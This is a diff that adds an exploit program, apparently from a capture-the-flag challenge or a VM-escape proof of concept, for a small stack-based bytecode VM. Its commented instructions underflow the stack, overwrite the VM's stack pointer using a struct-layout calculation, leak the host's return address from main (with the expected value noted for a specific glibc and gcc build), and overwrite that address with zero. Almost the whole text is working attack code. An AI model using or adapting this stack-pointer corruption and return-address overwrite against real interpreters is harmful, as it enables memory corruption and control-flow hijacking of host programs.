@@ -1,0 +1,43 @@
+// Minified:
+// .code: PUSH 253 PUSH 0 SUB DUP PUSH 1 ADD DUP PUSH 0 JNE 5 PUSH 78 PUSH 10 MUL PUSH 3 ADD DUP DUP DPRINTST DPRINTST PUSH 0 PUSH 0 END 
+
+ .code:
+    PUSH 253 PUSH 0 SUB     // PUSH -253
+    // loop: address pc=5 {
+        DUP PUSH 1 ADD      // top++;
+        DUP PUSH 0 JNE 5    // jnz loop;
+    // }
+    // sp is now 254
+    
+    // only 2 more ints before VM stack overflow
+    // we will use these for math
+    
+    // side note about the structure of the system:
+    // 256 ints in stack
+    // 1 int for sp
+    // 1 int of padding
+    // 128 const_t in pool * 4 ints worth per const_t
+    // 1 int for codeSize
+    // 1 int of padding
+    // =772 ints worth in the whole VM struct
+    
+    // return address from main is located at sp = 783 to 784
+
+    // push 783, using math to get numbers larger than 255
+    PUSH 78 PUSH 10 MUL
+    PUSH 3 ADD
+
+    // now overwrite the stack pointer
+    DUP DUP
+
+    // sp = 784
+    // currently at the high 32 bits of the return address
+    DPRINTST
+    // now at the low 32 bits
+    // expected value ...8f75 in hex for glibc 2.42-13 gcc 15.2.0
+    DPRINTST
+
+    // should overwrite the return address with 0
+    PUSH 0 PUSH 0
+
+    END
